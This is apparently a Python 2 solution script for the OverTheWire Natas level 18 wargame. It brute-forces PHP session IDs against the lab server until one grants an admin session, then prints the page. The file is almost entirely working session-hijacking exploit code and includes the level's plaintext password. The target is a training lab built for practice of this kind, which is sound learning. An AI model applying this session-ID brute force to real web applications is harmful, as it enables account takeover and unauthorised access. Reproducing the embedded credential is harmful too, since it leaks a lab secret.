import requests
import re
import logging

URL = 'http://natas18.natas.labs.overthewire.org/'
username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

session = requests.Session()

for session_id in range(1,640):

    response = session.get(URL,cookies = {"PHPSESSID" : str(session_id) }, auth = (username , password))

    
    if "You are an admin" in response.text:
        print session_id
        data = re.sub ('<head>.*head>','', response.text,flags = re.DOTALL)
        print data

        #result = re.search('<pre>(.*)<\pre>',data)
        #print result.group(1)
        break
    else:
        print "trying " , session_id
